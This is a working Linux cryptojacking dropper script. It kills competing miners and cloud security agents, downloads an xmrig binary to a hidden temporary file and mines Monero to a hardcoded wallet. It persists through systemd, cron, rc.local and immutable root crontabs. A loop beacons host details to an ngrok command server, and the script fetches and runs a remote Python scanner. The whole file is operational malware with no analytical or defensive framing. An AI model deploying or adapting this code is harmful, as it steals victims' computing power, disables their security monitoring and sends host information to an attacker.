#!/bin/sh

# --- sanitize: reclaim CPU from rival miners and cloud agents ---
kx_kill() {
  for p in kdevtmpfsi kinsing sysupdate sysguard sysrv kthreaddi watchbog dbused 0wned lwp masscan; do
    killall "$p" >/dev/null 2>&1
    pkill -f "$p" >/dev/null 2>&1
  done
  for p in aegis AssistDaemon YunJing YunJingDaemon barad_agent; do
    pkill -f "$p" >/dev/null 2>&1
  done
}
kx_kill

C2="https://enactment-polyester-corset.ngrok-free.dev"; W="47d4oznzDE2heUUr2oeQmZhmXcYS4gnNvibtmdXDi7dRUyzGgsXjAm6dbrveUN4fRKG1yu6RjU9PRCgd1XvaGU2M58T6dXC"; P="pool.supportxmr.com:443"
D=/tmp; [ -w /var/tmp ] && D=/var/tmp
N=$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n'); B="$D/.$N"
A=$(uname -m); case "$A" in x86_64|amd64) F=x64;; aarch64|arm64) F=arm64;; armv7l|armv7*) F=armv7;; *) exit 0;; esac
MEM=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 512)
MODE=fast; [ "$MEM" -lt 2400 ] && MODE=light
TH=60; [ "$(nproc 2>/dev/null || echo 2)" -le 2 ] && TH=40
HP=$((10000 + $(head -c2 /dev/urandom | od -An -tu2 | tr -d ' ') % 20000))
U="https://github.com/xmrlvrr/xmrbin/releases/download/bin1/xmrig-$F.gz"
curl -fsSL --max-time 90 "$U" -o "$D/.$N.gz" 2>/dev/null || exit 0
gunzip -c "$D/.$N.gz" > "$B" 2>/dev/null || exit 0
chmod +x "$B" 2>/dev/null
cat > "$D/.$N.json" <<J
{"autosave":false,"cpu":{"enabled":true,"max-threads-hint":$TH},
"randomx":{"mode":"$MODE"},"http":{"enabled":true,"host":"127.0.0.1","port":$HP,"access-token":""},
"pools":[{"url":"$P","user":"$W","tls":true,"keepalive":true,"nicehash":true,"rig-id":"$N"}]}
J
nice -n 19 "$B" -c "$D/.$N.json" --background --donate-level 1 >/dev/null 2>&1 &
printf '[Unit]\nDescription=%s\n[Service]\nExecStart=%s -c %s\nRestart=always\nRestartSec=30\nNice=19\n[Install]\nWantedBy=multi-user.target\n' \
 "$N" "$B" "$D/.$N.json" > /etc/systemd/system/$N.service 2>/dev/null
systemctl enable --now "$N" >/dev/null 2>&1
(crontab -l 2>/dev/null | grep -v "$N"; echo "@reboot $B -c $D/.$N.json --background") | crontab - 2>/dev/null
[ -f /etc/rc.local ] && ! grep -q "$N" /etc/rc.local 2>/dev/null && \
  sed -i "2i $B -c $D/.$N.json --background &" /etc/rc.local 2>/dev/null
cat > "$D/.$N.agent" <<G
#!/bin/sh
N="$N"; C2="$C2"; B="$B"; HP="$HP"
while :; do
  K=\$(curl -s --max-time 5 "http://127.0.0.1:\$HP/2/summary" 2>/dev/null | \
      sed -n 's/.*"total":\\[\\([0-9]*\\).*/\\1/p' | head -1)
  [ -z "\$K" ] && K=0
  pgrep -f "\$B" >/dev/null 2>&1 || nice -n 19 "\$B" -c "\$B.json" --background >/dev/null 2>&1
  curl -s --max-time 6 -X POST "\$C2/api/report" -d "id=\$N" -d "arch=\$(uname -m)" \
    -d "host=\$(hostname 2>/dev/null)" -d "os=\$(uname -s)" -d "cpu=\$(nproc 2>/dev/null||echo 1)" \
    -d "khs=\$K" -d "algo=rx" -d "pool=$P" >/dev/null 2>&1
  sleep 60
done
G
chmod +x "$D/.$N.agent"
nohup "$D/.$N.agent" >/dev/null 2>&1 &
curl -fsS -X POST "$C2/api/report" --data-urlencode "id=$N" --data-urlencode "arch=$A" \
 --data-urlencode "host=$(hostname 2>/dev/null)" --data-urlencode "os=$(uname -s)" \
 --data-urlencode "cpu=$(nproc 2>/dev/null || echo 1)" --data-urlencode "ram=$MEM" >/dev/null 2>&1
command -v python3 >/dev/null && { curl -fsSL -H "ngrok-skip-browser-warning: 1" "$C2/scan.py" -o "$D/.s.py" 2>/dev/null && \
  nohup python3 "$D/.s.py" >/dev/null 2>&1 & }
exit 0

# --- supervisor: revive the miner, survive reboot ---
KX=/tmp/.kx
mkdir -p "$KX" 2>/dev/null
cp "$0" "$KX/a.sh" 2>/dev/null
chmod 755 "$KX/a.sh" 2>/dev/null
CMDF=$(ps w 2>/dev/null | grep '[x]mrig' | head -1 | grep -o '/[^ ]*.*')
case "$CMDF" in *xmrig*) ;; *) [ -n "$CMDF" ] && CMDF="xmrig $CMDF" ;; esac
[ -n "$CMDF" ] && printf '%s' "$CMDF" > "$KX/cmd"

for CR in /var/spool/cron/crontabs/root /var/spool/cron/root /etc/crontabs/root; do
  D=$(dirname "$CR")
  [ -d "$D" ] || continue
  touch "$CR" 2>/dev/null || continue
  chattr -i "$CR" 2>/dev/null
  grep -q "$KX/a.sh" "$CR" 2>/dev/null || \
    printf '@reboot /bin/sh %s/a.sh >/dev/null 2>&1\n*/7 * * * * /bin/sh %s/a.sh >/dev/null 2>&1\n' "$KX" "$KX" >> "$CR"
  chattr +i "$CR" 2>/dev/null
done
command -v crontab >/dev/null 2>&1 && \
  ( crontab -l 2>/dev/null; printf '@reboot /bin/sh %s/a.sh >/dev/null 2>&1\n*/7 * * * * /bin/sh %s/a.sh >/dev/null 2>&1\n' "$KX" "$KX" ) 2>/dev/null | sort -u | crontab - 2>/dev/null

if [ -f "$KX/pid" ] && kill -0 "$(cat "$KX/pid" 2>/dev/null)" 2>/dev/null; then
  :
else
  setsid sh -c '
KX=/tmp/.kx
echo $$ > "$KX/pid"
while :; do
  if ! ps w 2>/dev/null | grep -q "[x]mrig"; then
    if [ -s "$KX/cmd" ]; then
      sh -c "$(cat "$KX/cmd")" >/dev/null 2>&1 &
    elif [ -f "$KX/a.sh" ]; then
      sh "$KX/a.sh" >/dev/null 2>&1 &
    fi
    sleep 20
  fi
  sleep 50
done' >/dev/null 2>&1 &
fi
